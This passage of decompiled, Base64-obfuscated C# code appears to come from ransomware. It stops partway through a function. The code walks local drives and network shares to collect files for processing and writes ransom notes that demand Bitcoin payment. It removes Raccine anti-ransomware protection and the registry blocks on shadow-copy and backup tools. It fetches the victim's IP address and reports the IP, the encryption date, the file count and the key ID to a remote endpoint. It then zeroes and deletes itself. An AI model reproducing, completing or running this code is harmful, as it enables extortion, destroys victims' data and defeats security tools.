				if (!text3.Contains(mHNJOupRlfk) && !cqwcNhPdCH)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + mHNJOupRlfk);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in uWeqxhASudz)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + "\\RESTORE_FILES_INFO.txt"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt", item + "\\RESTORE_FILES_INFO.txt", overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text4.Contains(mHNJOupRlfk) && !cqwcNhPdCH)
					{
						File.AppendAllText(item + "\\RESTORE_FILES_INFO.txt", "\r\nAdditional KeyId:\r\n" + mHNJOupRlfk);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!TmHfkYcJttrgO && num > 10)
			{
				break;
			}
		}
		if (rcWeiKQuaNvmbTJ == "YES")
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
					streamWriter2.WriteLine(aOUUGKAtMbj("MESSAGERICH"));
					streamWriter2.WriteLine("\r\n");
					streamWriter2.WriteLine(aOUUGKAtMbj("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPktleSBJZGVudGlmaWVyOiA="));
					streamWriter2.WriteLine(mHNJOupRlfk + aOUUGKAtMbj("PC9wPg=="));
					if (UimcEmUUufACwj == "NO")
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(aOUUGKAtMbj("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + aOUUGKAtMbj("TnVtYmVyIG9mIGZpbGVzIHRoYXQgd2VyZSBwcm9jZXNzZWQgaXM6IA==") + Convert.ToString(RQEvWqwCwPPGRO.Count) + aOUUGKAtMbj("PC9wPg=="));
					}
					if (BSFTTffCPqVFY)
					{
						streamWriter2.WriteLine("\r\n");
						streamWriter2.WriteLine(aOUUGKAtMbj("UEMgSGFyZHdhcmUgSUQ6IA=="));
						streamWriter2.WriteLine(dfEhXlxbLTgTMeE.UlxMqsudHxxdMYr());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					if (!text5.Contains(mHNJOupRlfk) && !cqwcNhPdCH)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta", aOUUGKAtMbj("PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPg==") + "\r\nAdditional KeyId:\r\n" + mHNJOupRlfk + aOUUGKAtMbj("PC9wPg=="));
					}
				}
			}
			catch
			{
			}
		}
		if (jmrzQmdMFBpQY == "YES")
		{
			try
			{
				if (UimcEmUUufACwj == "NO")
				{
					dfEhXlxbLTgTMeE.TAMnEyqxMAV("URL", "USERNAME", "ACCESO", string.Concat(aOUUGKAtMbj("Q2xpZW50IElQOiA="), new WebClient().DownloadString(aOUUGKAtMbj("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", aOUUGKAtMbj("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", aOUUGKAtMbj("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(RQEvWqwCwPPGRO.Count), "\r\n", aOUUGKAtMbj("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), mHNJOupRlfk));
				}
				else
				{
					dfEhXlxbLTgTMeE.TAMnEyqxMAV("URL", "USERNAME", "ACCESO", string.Concat(aOUUGKAtMbj("Q2xpZW50IElQOiA="), new WebClient().DownloadString(aOUUGKAtMbj("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r", aOUUGKAtMbj("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", aOUUGKAtMbj("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA=="), Convert.ToString(RQEvWqwCwPPGRO.Count), "\r\n", aOUUGKAtMbj("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), mHNJOupRlfk));
				}
			}
			catch
			{
			}
		}
		if (xXlCWFIIEXEPpmZot == "YES")
		{
			try
			{
				bHGKUwvihxg.QLaZpegeMyKRXl(new Uri(""));
			}
			catch
			{
			}
		}
		if (rcWeiKQuaNvmbTJ == "NO")
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					Process.Start(aOUUGKAtMbj("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta"))
				{
					Process.Start(aOUUGKAtMbj("bXNodGEuZXhl"), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.hta");
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(VJaXDrBeQfRs))
		{
			try
			{
				File.Delete(VJaXDrBeQfRs);
			}
			catch
			{
			}
		}
		if (hsBuExTBPOYZ)
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
				{
					string string_ = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
					TgCsKvBJUFtXrjRf.qONalJPEgIK(string_);
				}
			}
			catch
			{
			}
		}
		if (NZZJwvuCaIyu)
		{
			try
			{
				File.AppendAllText(agUGmZJGeSw, "All Done!");
			}
			catch (Exception)
			{
			}
		}
		if (JwpjLZyzESugtPnVS == "EVET")
		{
			VhbbmAnvAWgpo();
		}
	}

	public static void NijZAIeuREoBa()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(aOUUGKAtMbj("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), aOUUGKAtMbj("SW5mb3JtYXRpb24uLi4="), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int RmbfckpOKrQ(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> MGtLGKSuKkNl(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains("C:\\Program Files\\") && !text.Contains("C:\\Program Files (x86)\\") && !text.Contains(":\\Windows\\") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.Contains(":\\ProgramData\\") && !text.Contains("\\AppData\\") && !text.ToLower().Contains("msocache") && !text.ToLower().Contains("system volume information") && !text.ToLower().Contains("boot") && !text.ToLower().Contains("tor browser") && !text.ToLower().Contains("mozilla") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("google chrome") && !text.ToLower().Contains("application data"))
				{
					array = Directory.GetFiles(text);
					goto IL_0155;
				}
			}
			catch
			{
			}
			continue;
			IL_0155:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains("autoexec.bat") && !fileInfo.FullName.Contains("desktop.ini") && !fileInfo.FullName.Contains("autorun.inf") && !fileInfo.FullName.Contains("ntuser.dat") && !fileInfo.FullName.Contains("NTUSER.DAT") && !fileInfo.FullName.Contains("iconcache.db") && !fileInfo.FullName.Contains("bootsect.bak") && !fileInfo.FullName.Contains("boot.ini") && !fileInfo.FullName.Contains("ntuser.dat.log") && !fileInfo.FullName.Contains("thumbs.db") && !fileInfo.FullName.ToLower().Contains("bootmgr") && !fileInfo.FullName.ToLower().Contains("pagefile.sys") && !fileInfo.FullName.ToLower().Contains("config.sys") && !fileInfo.FullName.ToLower().Contains("ntuser.ini") && !fileInfo.FullName.Contains(aOUUGKAtMbj("QnVpbGRlcl9Mb2c=")) && !fileInfo.FullName.Contains("RSAKeys") && !fileInfo.FullName.Contains("Config.enc") && !fileInfo.FullName.Contains("RESTORE_FILES_INFO") && !fileInfo.FullName.EndsWith(".xlat7j") && !fileInfo.FullName.EndsWith("exe") && !fileInfo.FullName.EndsWith("dll") && !fileInfo.FullName.EndsWith("EXE") && !fileInfo.FullName.EndsWith("DLL") && !fileInfo.FullName.Contains("Recycle.Bin") && !fileInfo.FullName.Contains(eYxPrbivOxVq) && !fileInfo.FullName.Contains(agUGmZJGeSw) && !fileInfo.FullName.Contains(vTRFYbEeAJOls))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(ZevFDLuRwkwY) * 1024.0 * 1024.0 && dGKzCRKvbfM == "YES")
						{
							list.Add(fileInfo.FullName);
							ErxvXJZOXLaGvTFEwn(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && dGKzCRKvbfM == "NO")
						{
							list.Add(fileInfo.FullName);
							ErxvXJZOXLaGvTFEwn(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void yULfUxZlvFs()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!pJeeErfJlklnD.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					pJeeErfJlklnD.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim().Replace("IPC$", ""));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string BYWGmjrQxPOi(string gMBrZzDikIFUl = "", string WLCepfvkYuIzBUq = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = gMBrZzDikIFUl,
				Arguments = WLCepfvkYuIzBUq,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void YHrTJmrzht(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string jojTjVgCWQek(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string aOUUGKAtMbj(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void wnSUIUdJHSWSo(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = aOUUGKAtMbj("cG93ZXJzaGVsbC5leGU=");
		processStartInfo.Arguments = "& " + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool CykKXkKREIJHAsWDcF(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string TDDqpUYLupEmTn(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void MwiKdCIyCDjKms()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = jojTjVgCWQek("==wcu9Wa0B3Tg42bpRXdjVGeFBSZslmRgU2Zh1WSc52bpNnclZFduVmcyV3QcRlTgM3dvRmbpdFX0Z2bz9mcjlWTcVkUBdFVG90U");
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(aOUUGKAtMbj(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(aOUUGKAtMbj("dnNzYWRtaW4uZXhl"));
					registryKey.DeleteSubKey(aOUUGKAtMbj("d21pYy5leGU="));
					registryKey.DeleteSubKey(aOUUGKAtMbj("d2JhZG1pbi5leGU="));
					registryKey.DeleteSubKey(aOUUGKAtMbj("YmNkZWRpdC5leGU="));
					registryKey.DeleteSubKey(aOUUGKAtMbj("cG93ZXJzaGVsbC5leGU="));
					registryKey.DeleteSubKey(aOUUGKAtMbj("ZGlza3NoYWRvdy5leGU="));
					registryKey.DeleteSubKey(aOUUGKAtMbj("bmV0LmV4ZQ=="));
					registryKey.Close();
				}
				string_ = jojTjVgCWQek("u9Wa0F2YpxGcwFEXn9GT05WZ2VEXzV2YpZnclNFX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
				registryKey = Registry.LocalMachine.OpenSubKey(aOUUGKAtMbj(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(aOUUGKAtMbj("UmFjY2luZQ=="));
					registryKey.Close();
				}
				string_ = jojTjVgCWQek("=UkUBdFVG90U");
				registryKey = Registry.LocalMachine.OpenSubKey(aOUUGKAtMbj(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(aOUUGKAtMbj("UmFjY2luZQ=="));
					registryKey.Close();
				}
				string_ = jojTjVgCWQek("=UkUBdFVG90U");
				registryKey = Registry.CurrentUser.OpenSubKey(aOUUGKAtMbj(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(aOUUGKAtMbj("UmFjY2luZQ=="));
					registryKey.Close();
				}
			}
			catch
			{
			}
			BYWGmjrQxPOi(aOUUGKAtMbj("dGFza2tpbGw="), aOUUGKAtMbj("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			BYWGmjrQxPOi(aOUUGKAtMbj("cmVn"), aOUUGKAtMbj("ZGVsZXRlICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL1YgIlJhY2NpbmUgVHJheSIgL0Y="));
			BYWGmjrQxPOi(aOUUGKAtMbj("cmVn"), aOUUGKAtMbj("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			BYWGmjrQxPOi(aOUUGKAtMbj("c2NodGFza3M="), aOUUGKAtMbj("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void MBaDCxnytAAU(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(aOUUGKAtMbj("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void OnlrpoKezgfqtr()
	{
		string string_ = jojTjVgCWQek("==QblR3c5NVZslmRcx2byRnbvNEX0V2Us9mc052bDRnblJnc1NEXNVEVTl1U");
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(aOUUGKAtMbj(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(aOUUGKAtMbj("TG9uZ1BhdGhzRW5hYmxlZA=="), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void VhbbmAnvAWgpo()
	{
		BYWGmjrQxPOi("cmd.exe", aOUUGKAtMbj("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = aOUUGKAtMbj("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void nPNwbmqRpAob(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (NZZJwvuCaIyu)
			{
				try
				{
					File.AppendAllText(agUGmZJGeSw, "File: " + string_0 + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string bZzwXTgSpki()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string SxpNgXjLkDEXwMm(string string_0)
	{
		string text = Path.GetTempPath() + "\\RESTORE_FILES_INFO.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(aOUUGKAtMbj("QWxsIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZCBkdWUgdG8gYSBzZWN1cml0eSBwcm9ibGVtIHdpdGggeW91ciBQQy4gSWYgeW91IHdhbnQgdG8gcmVzdG9yZSB0aGVtLCB3cml0ZSB1cyB0byB0aGUgZS1tYWlsIFRpYmVyaWFub0Bhb2wuY29tDQpZb3UgaGF2ZSB0byBwYXkgZm9yIGRlY3J5cHRpb24gaW4gQml0Y29pbnMuIFRoZSBwcmljZSBkZXBlbmRzIG9uIGhvdyBmYXN0IHlvdSB3cml0ZSB0byB1cy4gQWZ0ZXIgcGF5bWVudCB3ZSB3aWxsIHNlbmQgeW91IHRoZSB0b29sIHRoYXQgd2lsbCBkZWNyeXB0IGFsbCB5b3VyIGZpbGVzLiANCkZyZWUgZGVjcnlwdGlvbiBhcyBndWFyYW50ZWUNCkJlZm9yZSBwYXlpbmcgeW91IGNhbiBzZW5kIHVzIHVwIHRvIDUgZmlsZXMgZm9yIGZyZWUgZGVjcnlwdGlvbi4gVGhlIHRvdGFsIHNpemUgb2YgZmlsZXMgbXVzdCBiZSBsZXNzIHRoYW4gNE1iIChub24gYXJjaGl2ZWQpLCBhbmQgZmlsZXMgc2hvdWxkIG5vdCBjb250YWluIHZhbHVhYmxlIGluZm9ybWF0aW9uLiAoZGF0YWJhc2VzLGJhY2t1cHMsIGxhcmdlIGV4Y2VsIHNoZWV0cywgZXRjLikgDQpIb3cgdG8gb2J0YWluIEJpdGNvaW5zDQpUaGUgZWFzaWVzdCB3YXkgdG8gYnV5IGJpdGNvaW5zIGlzIExvY2FsQml0Y29pbnMgc2l0ZS4gWW91IGhhdmUgdG8gcmVnaXN0ZXIsIGNsaWNrICdCdXkgYml0Y29pbnMnLCBhbmQgc2VsZWN0IHRoZSBzZWxsZXIgYnkgcGF5bWVudCBtZXRob2QgYW5kIHByaWNlLiANCmh0dHBzOi8vbG9jYWxiaXRjb2lucy5jb20vYnV5X2JpdGNvaW5zIA0KQWxzbyB5b3UgY2FuIGZpbmQgb3RoZXIgcGxhY2VzIHRvIGJ1eSBCaXRjb2lucyBhbmQgYmVnaW5uZXJzIGd1aWRlIGhlcmU6IA0KaHR0cDovL3d3dy5jb2luZGVzay5jb20vaW5mb3JtYXRpb24vaG93LWNhbi1pLWJ1eS1iaXRjb2lucy8gDQpBdHRlbnRpb24hDQpEbyBub3QgcmVuYW1lIGVuY3J5cHRlZCBmaWxlcy4gDQpEbyBub3QgdHJ5IHRvIGRlY3J5cHQgeW91ciBkYXRhIHVzaW5nIHRoaXJkIHBhcnR5IHNvZnR3YXJlLCBpdCBtYXkgY2F1c2UgcGVybWFuZW50IGRhdGEgbG9zcy4gDQpEZWNyeXB0aW9uIG9mIHlvdXIgZmlsZXMgd2l0aCB0aGUgaGVscCBvZiB0aGlyZCBwYXJ0aWVzIG1heSBjYXVzZSBpbmNyZWFzZWQgcHJpY2UgKHRoZXkgYWRkIHRoZWlyIGZlZSB0byBvdXIpIG9yIHlvdSBjYW4gYmVjb21lIGEgdmljdGltIG9mIGEgc2NhbS4g"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(aOUUGKAtMbj("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(string_0);
				if (BSFTTffCPqVFY)
				{
					streamWriter.WriteLine("\r\n");
					streamWriter.WriteLine(aOUUGKAtMbj("UEMgSGFyZHdhcmUgSUQ6IA=="));
					streamWriter.WriteLine(dfEhXlxbLTgTMeE.UlxMqsudHxxdMYr());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !cqwcNhPdCH)
				{
					File.AppendAllText(text, "\r\nAdditional KeyId:\r\n" + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (NZZJwvuCaIyu)
			{
				try
				{
					File.AppendAllText(agUGmZJGeSw, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void gbggMvBfPLB(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		JvcfwQzISk.pfuYRChnJGm CS_0024_003C_003E8__locals0 = new JvcfwQzISk();
		CS_0024_003C_003E8__locals0.rhGmYthDUQmUXY = string_1;
		CS_0024_003C_003E8__locals0.hwmNyjCXlGa = string_2;
		CS_0024_003C_003E8__locals0.ISyoXQMaLcr = string_3;
		CS_0024_003C_003E8__locals0.RSEJcjYBjVKvf = string_4;
		WLkpdSTfqi = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ISyoXQMaLcr);
		DriveInfo[] array = null;
		if (string_0[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !pJeeErfJlklnD.Contains(array[i].Name))
					{
						pJeeErfJlklnD.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!pJeeErfJlklnD.Contains(string_0[j]))
				{
					pJeeErfJlklnD.Add(string_0[j]);
				}
			}
		}
		if (pJeeErfJlklnD.Contains(aOUUGKAtMbj("Qzpc")) && SDjTTRoBMQV == "YES")
		{
			pJeeErfJlklnD.Remove(aOUUGKAtMbj("Qzpc"));
		}
		Parallel.ForEach(pJeeErfJlklnD, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new JvcfwQzISk.pfuYRChnJGm();
			CS_0024_003C_003E8__locals0.VGqtMNfXpOeV = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.uDDfTynCYnjkk = string_0;
			if (pKzqlEujtGte && !bZzwXTgSpki().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						CykKXkKREIJHAsWDcF(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.uDDfTynCYnjkk);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (UimcEmUUufACwj == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					wyXEoxYgFlx(CS_0024_003C_003E8__locals0.uDDfTynCYnjkk, CS_0024_003C_003E8__locals0.VGqtMNfXpOeV.rhGmYthDUQmUXY, CS_0024_003C_003E8__locals0.VGqtMNfXpOeV.RSEJcjYBjVKvf, CS_0024_003C_003E8__locals0.VGqtMNfXpOeV.hwmNyjCXlGa, CS_0024_003C_003E8__locals0.VGqtMNfXpOeV.ISyoXQMaLcr);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				wyXEoxYgFlx(CS_0024_003C_003E8__locals0.uDDfTynCYnjkk, CS_0024_003C_003E8__locals0.rhGmYthDUQmUXY, CS_0024_003C_003E8__locals0.RSEJcjYBjVKvf, CS_0024_003C_003E8__locals0.hwmNyjCXlGa, CS_0024_003C_003E8__locals0.ISyoXQMaLcr);
			}
		});
	}

	public static void wyXEoxYgFlx(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (QWTWQioUpGXBKGGIbO == "NO")
		{
			list = MGtLGKSuKkNl(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = ZrSLResrnzoS.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f3;
					}
				}
				if ((VdUyrckhXSQ == "NO" && !item.EndsWith(text)) || RQEvWqwCwPPGRO.Contains(item))
				{
					continue;
				}
				if (mGDrzdnKDnvM == "YES")
				{
					try
					{
						if (jKkQUJosFPVdk.waTjtdDWNGqfzuC(item))
						{
							jKkQUJosFPVdk.TMsATZeUtEjbUs(item);
						}
					}
					catch
					{
					}
				}
				RQEvWqwCwPPGRO.Add(item);
				if (!uWeqxhASudz.Contains(Path.GetDirectoryName(item)))
